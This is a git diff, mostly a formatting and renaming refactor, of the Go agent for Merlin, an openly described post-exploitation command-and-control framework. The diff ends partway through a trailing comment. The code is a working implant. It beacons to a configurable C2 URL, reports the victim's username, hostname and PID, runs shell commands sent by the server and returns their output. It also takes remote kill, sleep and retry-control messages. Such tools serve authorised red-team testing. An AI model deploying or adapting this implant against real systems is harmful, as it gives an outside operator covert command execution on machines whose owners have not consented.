@@ -1,49 +1,51 @@
-//Merlin is a post-exploitation command and control framework.
-//This file is part of Merlin.
-//Copyright (C) 2017  Russel Van Tuyl
+// Merlin is a post-exploitation command and control framework.
+// This file is part of Merlin.
+// Copyright (C) 2017  Russel Van Tuyl
 
-//Merlin is free software: you can redistribute it and/or modify
-//it under the terms of the GNU General Public License as published by
-//the Free Software Foundation, either version 3 of the License, or
-//(at your option) any later version.
+// Merlin is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// any later version.
 
-//Merlin is distributed in the hope that it will be useful,
-//but WITHOUT ANY WARRANTY; without even the implied warranty of
-//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-//GNU General Public License for more details.
+// Merlin is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
 
-//You should have received a copy of the GNU General Public License
-//along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
+// You should have received a copy of the GNU General Public License
+// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
+
 package main
 
 import (
 	"bytes"
 	"crypto/tls"
 	"encoding/json"
+	"flag"
 	"fmt"
+	"math/rand"
 	"net/http"
 	"os"
 	"os/user"
-	"time"
-	"flag"
 	"runtime"
-	"math/rand"
 	"strconv"
+	"time"
 
 	"github.com/fatih/color"
 	"github.com/satori/go.uuid"
 	"golang.org/x/net/http2"
 
-	"github.com/ne0nd0g/merlin/pkg/messages"
 	"github.com/ne0nd0g/merlin/pkg/agent"
+	"github.com/ne0nd0g/merlin/pkg/messages"
 )
 
-//GLOBAL VARIABLES
-var DEBUG = false
-var VERBOSE = false
-var RUN = true
+// GLOBAL VARIABLES
+
+var debug = false
+var verbose = false
+var mRun = true
 var hostUUID = uuid.NewV4()
-var URL = "https://127.0.0.1:443/"
+var url = "https://127.0.0.1:443/"
 var h2Client = getH2WebClient()
 var waitTime = 30000 * time.Millisecond
 var agentShell = ""
@@ -55,42 +57,44 @@ var maxRetry = 7
 var failedCheckin = 0
 var initial = false
 
-//Constants
+// Constants
 const (
-    letterIdxBits = 6                    // 6 bits to represent a letter index
-    letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
-    letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
-    letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+	letterIdxBits = 6                    // 6 bits to represent a letter index
+	letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
+	letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
+	letterBytes   = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 )
 
 func main() {
 
-	flag.BoolVar(&VERBOSE, "v", false, "Enable verbose output")
-	flag.BoolVar(&DEBUG, "debug", false, "Enable debug output")
-	flag.StringVar(&URL, "url", URL, "Full URL for agent to connect to")
-	flag.DurationVar(&waitTime, "sleep", 30000 * time.Millisecond, "Time for agent to sleep")
+	flag.BoolVar(&verbose, "v", false, "Enable verbose output")
+	flag.BoolVar(&debug, "debug", false, "Enable debug output")
+	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
+	flag.DurationVar(&waitTime, "sleep", 30000*time.Millisecond, "Time for agent to sleep")
 	flag.Usage = usage
 	flag.Parse()
 
-	if VERBOSE {
+	if verbose {
 		color.Yellow("[-]Agent version: %s", version)
 		color.Yellow("[-]Agent build: %s", build)
 	}
 
-	for RUN {
+	for mRun {
 		if initial {
-			if VERBOSE {
+			if verbose {
 				color.Yellow("[-]Checking in")
 			}
-			statusCheckIn(URL, h2Client)
+			statusCheckIn(url, h2Client)
 		} else {
-			initial = initialCheckIn(URL, h2Client)
+			initial = initialCheckIn(url, h2Client)
 			if initial {
-				agentInfo(URL, h2Client)
+				agentInfo(url, h2Client)
 			}
 		}
-		if failedCheckin >= maxRetry {os.Exit(1)}
-		if VERBOSE {
+		if failedCheckin >= maxRetry {
+			os.Exit(1)
+		}
+		if verbose {
 			color.Yellow("[-]Sleeping for %s at %s", waitTime.String(), time.Now())
 		}
 		time.Sleep(waitTime)
@@ -99,22 +103,22 @@ func main() {
 
 func initialCheckIn(host string, client *http.Client) bool {
 	u, errU := user.Current()
-	if errU != nil{
-		if DEBUG {
+	if errU != nil {
+		if debug {
 			color.Red("[!]There was an error getting the username")
 			color.Red(errU.Error())
 		}
 	}
 
 	h, errH := os.Hostname()
-	if errH != nil{
-		if DEBUG {
+	if errH != nil {
+		if debug {
 			color.Red("[!]There was an error getting the hostname")
 			color.Red(errH.Error())
 		}
 	}
 
-	if VERBOSE {
+	if verbose {
 		color.Green("[+]Host Information:")
 		color.Green("\tAgent UUID: %s", hostUUID)
 		color.Green("\tPlatform: %s", runtime.GOOS)
@@ -125,63 +129,66 @@ func initialCheckIn(host string, client *http.Client) bool {
 		color.Green("\tPID: %d", os.Getpid())
 	}
 
-	//JSON "initial" payload object
+	// JSON "initial" payload object
 	i := messages.SysInfo{
-		Platform: runtime.GOOS,
+		Platform:     runtime.GOOS,
 		Architecture: runtime.GOARCH,
-		UserName: u.Username,
-		UserGUID: u.Gid,
-		HostName: h,
-		Pid: os.Getpid(),
+		UserName:     u.Username,
+		UserGUID:     u.Gid,
+		HostName:     h,
+		Pid:          os.Getpid(),
 	}
 
 	payload, errP := json.Marshal(i)
 
 	if errP != nil {
-		if DEBUG {
+		if debug {
 			color.Red("[!]There was an error marshaling the JSON object")
 			color.Red(errP.Error())
 		}
 	}
 
-	//JSON message to be sent to the server
+	// JSON message to be sent to the server
 	g := messages.Base{
 		Version: 1.0,
 		ID:      hostUUID,
-		Type:    "InitialCheckIn", //Can set this to a constant in messages.go
+		Type:    "InitialCheckIn", // Can set this to a constant in messages.go
 		Payload: (*json.RawMessage)(&payload),
-		Padding: RandStringBytesMaskImprSrc(paddingMax),
+		Padding: randStringBytesMaskImprSrc(paddingMax),
 	}
 
 	b := new(bytes.Buffer)
 	json.NewEncoder(b).Encode(g)
-	if VERBOSE {
+	if verbose {
 		color.Yellow("[-]Connecting to web server at %s for initial check in.", host)
 	}
 	resp, err := client.Post(host, "application/json; charset=utf-8", b)
 
 	if err != nil {
-		failedCheckin += 1
-		if DEBUG {
+		failedCheckin++
+		if debug {
 			color.Red("[!]There was an error with the HTTP client while performing a POST:")
 			color.Red(err.Error())
 		}
-		if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
+		if verbose {
+			color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)
+		}
 		return false
-	} else {
-		if DEBUG {
-			color.Red("[DEBUG]HTTP Response:")
-			color.Red("[DEBUG]%s", resp)
+	}
+	if debug {
+		color.Red("[debug]HTTP Response:")
+		color.Red("[debug]%s", resp)
+	}
+	if resp.StatusCode != 200 {
+		failedCheckin++
+		if verbose {
+			color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)
 		}
-		if resp.StatusCode != 200 {
-			failedCheckin += 1
-			if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
-			if DEBUG {
-				color.Red("[!]There was an error communicating with the server!")
-				color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
-			}
-			return false
+		if debug {
+			color.Red("[!]There was an error communicating with the server!")
+			color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
 		}
+		return false
 	}
 	failedCheckin = 0
 	return true
@@ -192,38 +199,42 @@ func statusCheckIn(host string, client *http.Client) {
 		Version: 1.0,
 		ID:      hostUUID,
 		Type:    "StatusCheckIn",
-		Padding: RandStringBytesMaskImprSrc(paddingMax),
+		Padding: randStringBytesMaskImprSrc(paddingMax),
 	}
 
 	b := new(bytes.Buffer)
 	json.NewEncoder(b).Encode(g)
 
-	if VERBOSE {
+	if verbose {
 		color.Yellow("[-]Connecting to web server at %s for status check in.", host)
 	}
 
 	resp, err := client.Post(host, "application/json; charset=utf-8", b)
 
 	if err != nil {
-		if DEBUG{
+		if debug {
 			color.Red("[!]There was an error with the HTTP Response:")
-			color.Red(err.Error()) //On Mac I get "read: connection reset by peer" here but not on other platforms
-		}			      //Only does this with a 10s Sleep
-		failedCheckin += 1
-		if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
+			color.Red(err.Error()) // On Mac I get "read: connection reset by peer" here but not on other platforms
+		} // Only does this with a 10s Sleep
+		failedCheckin++
+		if verbose {
+			color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)
+		}
 		return
 	}
 
-	if DEBUG {
+	if debug {
 		color.Red("%s", "[DEBUG]HTTP Response:")
 		color.Red("[DEBUG]ContentLength: %d", resp.ContentLength)
 		color.Red("[DEBUG]%s", resp)
 	}
 
 	if resp.StatusCode != 200 {
-		failedCheckin += 1
-		if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
-		if DEBUG {
+		failedCheckin++
+		if verbose {
+			color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)
+		}
+		if debug {
 			color.Red("[!]There was an error communicating with the server!")
 			color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
 		}
@@ -239,21 +250,21 @@ func statusCheckIn(host string, client *http.Client) {
 		}
 		json.NewDecoder(resp.Body).Decode(&j)
 
-		if DEBUG {
+		if debug {
 			color.Red("[DEBUG]Agent ID: %s", j.ID)
 			color.Red("[DEBUG]Message Type: %s", j.Type)
 			color.Red("[DEBUG]Message Payload: %s", j.Payload)
-		} else if VERBOSE {
+		} else if verbose {
 			color.Green("%s Message Type Received!", j.Type)
 		}
-		switch j.Type{ //TODO add self destruct that will find the .exe current path and start a new process to delete it after initial sleep
+		switch j.Type { // TODO add self destruct that will find the .exe current path and start a new process to delete it after initial sleep
 		case "CmdPayload":
 			var p messages.CmdPayload
 			json.Unmarshal(payload, &p)
-			stdout, stderr := executeCommand(p) //TODO this needs to be its own routine so the agent can continue to function while it is going
+			stdout, stderr := executeCommand(p) // TODO this needs to be its own routine so the agent can continue to function while it is going
 
 			c := messages.CmdResults{
-				Job: p.Job,
+				Job:    p.Job,
 				Stdout: stdout,
 				Stderr: stderr,
 			}
@@ -264,11 +275,11 @@ func statusCheckIn(host string, client *http.Client) {
 				ID:      j.ID,
 				Type:    "CmdResults",
 				Payload: (*json.RawMessage)(&k),
-				Padding: RandStringBytesMaskImprSrc(paddingMax),
+				Padding: randStringBytesMaskImprSrc(paddingMax),
 			}
 			b2 := new(bytes.Buffer)
 			json.NewEncoder(b2).Encode(g)
-			if VERBOSE {
+			if verbose {
 				color.Yellow("Sending response to server: %s", stdout)
 			}
 			resp2, _ := client.Post(host, "application/json; charset=utf-8", b2)
@@ -276,11 +287,11 @@ func statusCheckIn(host string, client *http.Client) {
 				color.Red("Message error from server. HTTP Status code: %d", resp2.StatusCode)
 			}
 		case "ServerOk":
-			if VERBOSE {
+			if verbose {
 				color.Yellow("[-]Received Server OK, doing nothing")
 			}
 		case "AgentControl":
-			if VERBOSE {
+			if verbose {
 				color.Yellow("[-]Received Agent Control Message")
 			}
 			var p messages.AgentControl
@@ -288,17 +299,17 @@ func statusCheckIn(host string, client *http.Client) {
 
 			switch p.Command {
 			case "kill":
-				if VERBOSE {
+				if verbose {
 					color.Yellow("[-]Received Agent Kill Message")
 				}
 				os.Exit(0)
 			case "sleep":
-				if VERBOSE {
+				if verbose {
 					color.Yellow("[-]Setting agent sleep time to %s milliseconds", p.Args)
 				}
 				t, err := time.ParseDuration(p.Args)
 				if err != nil {
-					if VERBOSE {
+					if verbose {
 						color.Red("[!]There was an error changing the agent waitTime")
 						color.Red(err.Error())
 					}
@@ -307,7 +318,7 @@ func statusCheckIn(host string, client *http.Client) {
 					waitTime = t
 					agentInfo(host, client)
 				} else {
-					if VERBOSE {
+					if verbose {
 						color.Red("[!]The agent was provided with a time that was not greater than zero.")
 						color.Red("The provided time was: %s", t.String())
 					}
@@ -315,17 +326,17 @@ func statusCheckIn(host string, client *http.Client) {
 			case "padding":
 				t, err := strconv.Atoi(p.Args)
 				if err != nil {
-					if VERBOSE {
+					if verbose {
 						color.Red("[!]There was an error changing the agent message padding size")
 					}
 				}
-				if VERBOSE {
+				if verbose {
 					color.Yellow("[-]Setting agent message maximum padding size to %d", t)
 				}
 				paddingMax = t
 				agentInfo(host, client)
 			case "initialize":
-				if VERBOSE {
+				if verbose {
 					color.Yellow("[-]Received agent re-initialize message")
 				}
 				initial = false
@@ -333,17 +344,17 @@ func statusCheckIn(host string, client *http.Client) {
 
 				t, err := strconv.Atoi(p.Args)
 				if err != nil {
-					if VERBOSE {
+					if verbose {
 						color.Red("[!]There was an error changing the agent max retries")
 					}
 				}
-				if VERBOSE {
+				if verbose {
 					color.Yellow("[-]Setting agent max retries to %d", t)
 				}
 				maxRetry = t
 				agentInfo(host, client)
 			default:
-				if VERBOSE {
+				if verbose {
 					color.Red("[!}Unknown AgentControl message type received %s", p.Command)
 				}
 			}
@@ -355,7 +366,7 @@ func statusCheckIn(host string, client *http.Client) {
 
 func getH2WebClient() *http.Client {
 
-	//Setup TLS Configuration
+	// Setup TLS Configuration
 	tr := &http2.Transport{
 		TLSClientConfig: &tls.Config{
 			MinVersion:               tls.VersionTLS12,
@@ -370,7 +381,7 @@ func getH2WebClient() *http.Client {
 		DisableCompression: false,
 	}
 
-	//Setup HTTP Client Configuration
+	// Setup HTTP Client Configuration
 	client := &http.Client{
 		Transport: tr,
 	}
@@ -378,17 +389,17 @@ func getH2WebClient() *http.Client {
 }
 
 func executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
-	if DEBUG {
+	if debug {
 		color.Red("[DEBUG]Received input parameter for executeCommand function: %s", j)
 
-	} else if VERBOSE {
+	} else if verbose {
 		color.Green("Executing command %s %s %s", agentShell, j.Command, j.Args)
 	}
 
 	stdout, stderr = agent.ExecuteCommand(j.Command, j.Args)
 
-	if VERBOSE{
-		if stderr != ""{
+	if verbose {
+		if stderr != "" {
 			color.Red("[!]There was an error executing the command: %s", j.Command)
 			color.Green(stdout)
 			color.Red("Error: %s", stderr)
@@ -398,48 +409,48 @@ func executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
 		}
 	}
 
-	return stdout, stderr //TODO return if the output was stdout or stderr and color stderr red on server
+	return stdout, stderr // TODO return if the output was stdout or stderr and color stderr red on server
 }
 
 func usage() {
-    fmt.Fprintf(os.Stderr, "usage: go run agent -v -debug\n")
-    flag.PrintDefaults()
-    os.Exit(2)
+	fmt.Fprintf(os.Stderr, "usage: go run agent -v -debug\n")
+	flag.PrintDefaults()
+	os.Exit(2)
 }
 
-func RandStringBytesMaskImprSrc(n int) string {
-	//http://stackoverflow.com/questions/22892120/how-to-generate-a-random-string-of-a-fixed-length-in-golang
-    b := make([]byte, n)
-    // A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
-    for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
-        if remain == 0 {
-            cache, remain = src.Int63(), letterIdxMax
-        }
-        if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
-            b[i] = letterBytes[idx]
-            i--
-        }
-        cache >>= letterIdxBits
-        remain--
-    }
+func randStringBytesMaskImprSrc(n int) string {
+	// http://stackoverflow.com/questions/22892120/how-to-generate-a-random-string-of-a-fixed-length-in-golang
+	b := make([]byte, n)
+	// A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
+	for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
+		if remain == 0 {
+			cache, remain = src.Int63(), letterIdxMax
+		}
+		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
+			b[i] = letterBytes[idx]
+			i--
+		}
+		cache >>= letterIdxBits
+		remain--
+	}
 
-    return string(b)
+	return string(b)
 }
 
-func agentInfo(host string, client *http.Client){
+func agentInfo(host string, client *http.Client) {
 	i := messages.AgentInfo{
-		Version: version,
-		Build: build,
-		WaitTime: waitTime.String(),
-		PaddingMax: paddingMax,
-		MaxRetry: maxRetry,
+		Version:       version,
+		Build:         build,
+		WaitTime:      waitTime.String(),
+		PaddingMax:    paddingMax,
+		MaxRetry:      maxRetry,
 		FailedCheckin: failedCheckin,
 	}
 
 	payload, errP := json.Marshal(i)
 
 	if errP != nil {
-		if DEBUG {
+		if debug {
 			color.Red("[!]There was an error marshaling the JSON object")
 			color.Red(errP.Error())
 		}
@@ -450,41 +461,45 @@ func agentInfo(host string, client *http.Client){
 		ID:      hostUUID,
 		Type:    "AgentInfo",
 		Payload: (*json.RawMessage)(&payload),
-		Padding: RandStringBytesMaskImprSrc(paddingMax),
+		Padding: randStringBytesMaskImprSrc(paddingMax),
 	}
 
 	b := new(bytes.Buffer)
 	json.NewEncoder(b).Encode(g)
-	if VERBOSE {
+	if verbose {
 		color.Yellow("[-]Connecting to web server at %s to update agent configuration information.", host)
 	}
 	resp, err := client.Post(host, "application/json; charset=utf-8", b)
 
 	if err != nil {
-		failedCheckin += 1
-		if DEBUG {
+		failedCheckin++
+		if debug {
 			color.Red("[!]There was an error with the HTTP client while performing a POST:")
 			color.Red(err.Error())
 		}
-		if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
+		if verbose {
+			color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)
+		}
 		return
-	} else {
-		if DEBUG {
-			color.Red("[DEBUG]HTTP Response:")
-			color.Red("[DEBUG]%s", resp)
+	}
+	if debug {
+		color.Red("[DEBUG]HTTP Response:")
+		color.Red("[DEBUG]%s", resp)
+	}
+	if resp.StatusCode != 200 {
+		failedCheckin++
+		if verbose {
+			color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)
 		}
-		if resp.StatusCode != 200 {
-			failedCheckin += 1
-			if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
-			if DEBUG {
-				color.Red("[!]There was an error communicating with the server!")
-				color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
-			}
-			return
+		if debug {
+			color.Red("[!]There was an error communicating with the server!")
+			color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
 		}
+		return
 	}
 	failedCheckin = 0
 }
+
 /*
 
 1. POST System Enumeration Information and receive back JSON object w/ additional instructions
